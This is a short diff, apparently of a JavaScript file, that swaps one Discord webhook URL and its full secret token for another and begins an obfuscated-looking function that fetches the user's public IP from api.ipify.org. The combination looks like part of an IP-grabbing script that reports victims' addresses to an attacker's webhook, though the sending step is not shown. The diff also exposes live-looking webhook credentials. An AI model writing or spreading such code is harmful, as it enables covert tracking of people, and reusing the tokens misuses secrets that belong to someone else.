@@ -1,5 +1,5 @@
 const WEBHOOK_URL =
-  'https://discord.com/api/webhooks/1264998026720706652/6Y-N3K7k18TaXuSZ0ipV6grvLZV8oHXFUksiGghIDviPOrSfQzONkPuTvTsEgUA7xqXe'
+  'https://discord.com/api/webhooks/1268934131065032876/ELyWMXxu0-G8ivDYBnccWfqUUzcIIvUuECXZlynNNkNM9wvi-YMgS-Ic2P6U1PRhQNOW'
 async function fetchIP() {
   try {
     const _0x556c6f = await fetch('https://api.ipify.org')
